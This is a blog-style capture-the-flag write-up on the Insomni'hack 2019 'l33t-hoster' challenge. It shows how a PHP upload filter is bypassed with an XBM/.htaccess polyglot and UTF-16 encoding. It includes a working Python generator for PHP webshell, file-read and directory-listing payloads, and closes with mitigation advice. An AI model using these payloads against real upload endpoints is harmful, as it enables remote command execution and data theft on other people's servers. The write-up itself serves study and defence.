---
title: "Htaccess, or how to bypass file upload mechanisms."
description: "Discover how to bypass file upload mechanisms by exploiting a file upload vulnerability. I guide you through the sophisticated techniques used to upload a malicious file to a target system, illustrated with the example of the l33t-hoster challenge from the Insomni'hack Teaser 2019 CTF. Learn how to create a polyglot file and bypass anti-PHP protection, while understanding the necessary security measures to counter such attacks. An essential article for cybersecurity enthusiasts looking to deepen their knowledge of file upload security."
date: 2023-10-04T16:00:00+01:00
draft: false
images: [/images/bypass-file-upload/htaccess.png]
featuredImage: "/images/bypass-file-upload/htaccess.png"
featuredImagePreview: "/images/bypass-file-upload/htaccess.png"
tags: ["Pentest", "Penetration Test", "CTF"]
author: "Thibaud Robin"
---

# 📂 How to bypass file upload mechanisms?

## Introduction

A file upload vulnerability is a security flaw that allows an attacker to upload a malicious file to a target system. This malicious file can then be used to execute arbitrary code, steal data, or cause other damage.

There are multiple ways to bypass file upload mechanisms. This article is inspired by the l33t-hoster challenge from [Insomni'hack Teaser 2019 CTF](https://ctftime.org/event/686).

So, follow the guide!

## Example of vulnerable code

The objective of the challenge was to execute commands on the remote server using the file upload functionality. However, this feature seems well-protected.

The source code of the page is provided below.

```php
<?php
if (isset($_GET["source"]))
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);

if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>

<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
```

The web page rendering is relatively simple:

![Website rendering](/images/bypass-file-upload/2023-10-05-16-29-21.png)

To summarize the analysis of the security filters:

- The application checks **the file extension**. If the file ends with `.php` or something similar, it is rejected.
- The application checks **the file name**. If the file name cannot be split into two parts with the `.php` separator, it is rejected.
- The application checks **the content**. If the string `<?` is present in the content, the file is rejected.
- The application checks **the header**. If the file is not an image, it is rejected.
- The application checks **the size**. If the height and width of the file are not equal to 1337, the file is rejected.

How to proceed?

## Choosing the right file

In summary, it is not possible to upload files with the `.php` extension. The goal is to obtain the ability to execute PHP code in a file other than `.php`. For this, it is possible to use a `.htaccess` file.

But what is a `.htaccess` file?

> A `.htaccess` file is a configuration file that allows you to modify the behavior of an Apache web server. It is usually located in the root directory of a website, but it can also be placed in subdirectories.

More details here: https://httpd.apache.org/docs/2.4/en/howto/htaccess.html

A `.htaccess` file can have the following configuration:

```bash
AddType application/x-httpd-php .php16      # Say all files with extension .php16 will execute PHP
php_value zend.multibyte 1                  # Enable specific encoding
php_value zend.detect_unicode 1             # Detect if the file has Unicode content
php_value display_errors 1                  # Display PHP errors
```

1. The first line indicates that we want to execute PHP using the `.php16` extension.
2. The second line indicates a specific encoding.
3. The third line indicates if the file has a specific encoding.
4. The fourth line indicates to display PHP errors (useful in our case).

This configuration file could allow command execution. However, during the upload, the application gives the following error:

`lol filename is empty`

By analyzing the code, it splits the string into two parts with `.` and checks if there are indeed two parts. Therefore, you need to send a file name like `..htaccess` to bypass this filter.

Next error:

`not an image.`

Indeed, we are not uploading an image but a configuration file. We need to find a way to bypass the following code:

```php
if (!exif_imagetype($tmp_name)) {
    die("not an image.");
}
```

## Creating a polyglot file

What is a polyglot file?

> A polyglot file is a file that can be interpreted in multiple different languages. It is usually a binary file that contains data in multiple formats, such as code instructions, configuration data, or text data.

The first trick is to find a way to bypass the image checker. The PHP documentation provides a clue on how to proceed: http://php.net/manual/en/function.exif-imagetype.php

At the bottom of the page, a format seems interesting:

![](/images/bypass-file-upload/2023-10-05-16-42-43.png)

Ok, but what is an XBM file?

> X BitMap, abbreviated XBM, is a monochrome digital image format originally designed for the X Window system, particularly for pointer and icon images.

The page contains an example:

```c
#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
0x00, 0x60 };
```

The format of `xbitmap` is quite clear. The size of the image is noted on the first lines of the file using a `#`. This format, very close to the `.htaccess` format, allows bypassing the `exif_imagetype($tmp_name)` function of the program.

Here is the content of the new `..htaccess` file:

```bash
#define width 1337                          # Define the width required by the code
#define height 1337                         # Define the height

AddType application/x-httpd-php .php16      # Say all files with extension .php16 will execute PHP

php_value zend.multibyte 1                  # Enable specific encoding
php_value zend.detect_unicode 1             # Detect if the file has Unicode content
php_value display_errors 1                  # Display PHP errors
```

The file is correctly processed and uploaded to the server!

![](/images/bypass-file-upload/2023-10-05-16-51-19.png)

## Bypassing anti-PHP protection

Another filter prevents the upload of PHP content by checking for the string `<?`. However, it is possible to bypass this protection by encoding the payload.

Indeed, PHP supports multiple encoding formats. Currently, the basic writing is in utf-8, but PHP also supports utf-16 encoding.

In utf-8, a character is encoded on 1 byte.

```php
00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  <?php system($_G
00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
00000020: 293b 203f 3e0a                           ); ?>.
```

However, in utf-16, the encoding is done on **2 bytes**.

```php
00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .<.?.p.h.p. .s.y
00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
00000030: 005d 0029 003b 0020 0064 0069 0065 0028  .].).;. .d.i.e.(
00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.>.
```

Here, a **utf-16 Big Endian** encoding was chosen. The first character `<` will be written as `003c` in utf-16 instead of `3c` in utf-8. With this trick, the filter is bypassed.

Here is a small Python script to automate the creation of the payload.

```python
#!/usr/bin/env python3
# Description : create and bypass file upload filter with .htaccess
# Author : Thibaud Robin

# Will prove the file is a legit xbitmap file and the size is 1337x1337
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
    phpfile = open(filename, 'wb')
    phpfile.write(script.encode('utf-16be'))
    phpfile.write(SIZE_HEADER)
    phpfile.close()

def generate_htacess():
    htaccess = open('..htaccess', 'wb')
    htaccess.write(SIZE_HEADER)
    htaccess.write(b'AddType application/x-httpd-php .php16\n')
    htaccess.write(b'php_value zend.multibyte 1\n')
    htaccess.write(b'php_value zend.detect_unicode 1\n')
    htaccess.write(b'php_value display_errors 1\n')
    htaccess.close()

generate_htacess()

generate_php_file("webshell.php16", "<?php system($_GET['cmd']); die(); ?>")
generate_php_file("scandir.php16", "<?php echo implode('\n', scandir($_GET['dir'])); die(); ?>")
generate_php_file("getfile.php16", "<?php echo file_get_contents($_GET['file']); die(); ?>")
generate_php_file("info.php16", "<?php phpinfo(); die(); ?>")
```

All that's left is to upload and enjoy your well-deserved webshell. Phew! 😂

![](/images/bypass-file-upload/2023-10-05-16-56-26.png)

![](/images/bypass-file-upload/2023-10-05-16-56-29.png)

## Conclusion

It is complex to implement a completely secure file upload feature.

To protect against the bypasses used in this challenge, the developer could have implemented the following security measures:
1. Use `ImageMagick` functions to verify files before uploading them.
2. Better verify the file extension.
3. Prevent the interpretation of `.htaccess` files in the directory.
4. Install a WAF (Web Application Firewall) like Apache's ModSecurity.

Remember! Never trust user inputs!
